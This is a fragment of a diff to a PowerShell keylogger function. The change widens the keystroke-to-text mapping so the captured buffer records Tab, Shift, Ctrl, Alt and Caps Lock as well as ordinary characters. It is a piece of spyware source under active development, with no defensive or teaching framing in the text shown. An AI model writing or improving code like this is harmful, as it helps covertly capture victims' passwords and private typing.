@@ -80,8 +80,13 @@ function KeyLogger {
 
                 switch ($ascii) {
                     8   { $buffer += "[BACKSPACE]" }
-                    32  { $buffer += " " }
+                    9   { $buffer += "[TAB]" }
                     13  { $buffer += "[ENTER]" }
+                    16  { $buffer += "[SHIFT]" }
+                    17  { $buffer += "[CTRL]" }
+                    18  { $buffer += "[ALT]" }
+                    20  { $buffer += "[CAPSLOCK]" }
+                    32  { $buffer += " " }
                     default {
                         if ($API::ToUnicode($ascii, $mapKey, $keyboardState, $loggedchar, $loggedchar.Capacity, 0)) {
                             $buffer += $loggedchar
